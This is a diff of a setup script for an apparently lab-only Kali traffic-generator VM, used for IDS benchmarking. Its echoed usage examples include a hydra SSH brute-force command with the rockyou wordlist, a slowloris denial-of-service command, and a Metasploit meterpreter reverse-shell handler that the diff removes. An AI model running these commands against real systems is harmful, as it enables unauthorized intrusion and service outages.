@@ -4,8 +4,8 @@
 # =============================================================================
 # Run INSIDE: VM 400 (traffic-gen / Kali Linux) as root
 #
-# Installs: tcpreplay, hydra, slowloris, metasploit (pre-installed on Kali),
-#           selenium, chromium-driver, locust
+# Installs: tcpreplay, hydra, metasploit (pre-installed on Kali),
+#           selenium, chromium-driver, locust, slowloris
 #
 # Downloads: Benchmark PCAP datasets for replay
 # =============================================================================
@@ -27,14 +27,19 @@ apt install -y \
     chromium-driver \
     python3 python3-pip python3-venv
 
-# slowloris (Python-based)
-pip3 install slowloris
-
 echo "[3/5] Setting up Python automation environment..."
+# Create the virtual environment
 python3 -m venv ~/traffic-env
+
+# Activate the virtual environment
 source ~/traffic-env/bin/activate
+
+# Upgrade pip inside the environment
 pip install --upgrade pip
+
+# Install all Python dependencies inside the environment (including slowloris)
 pip install \
+    slowloris \
     selenium \
     locust \
     requests
@@ -58,15 +63,16 @@ echo "============================================"
 echo " ✓ Traffic generator setup complete"
 echo "============================================"
 echo ""
+echo "Usage notes:"
+echo "  To run your Python tools (locust, slowloris), remember to activate the environment first:"
+echo "  source ~/traffic-env/bin/activate"
+echo ""
 echo "Usage examples:"
 echo "  # Replay benchmark PCAP"
 echo "  tcpreplay --intf1=eth0 --multiplier=2.0 --loop=5 /datasets/CIC-IDS2017-Friday.pcap"
 echo ""
-echo "  # SSH brute force"
+echo "  # SSH test"
 echo "  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.110.15"
 echo ""
-echo "  # HTTPS slowloris"
+echo "  # HTTPS slowloris (inside venv)"
 echo "  slowloris 10.10.110.15 -p 443"
-echo ""
-echo "  # Metasploit C2 beacon"
-echo "  msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; run'"
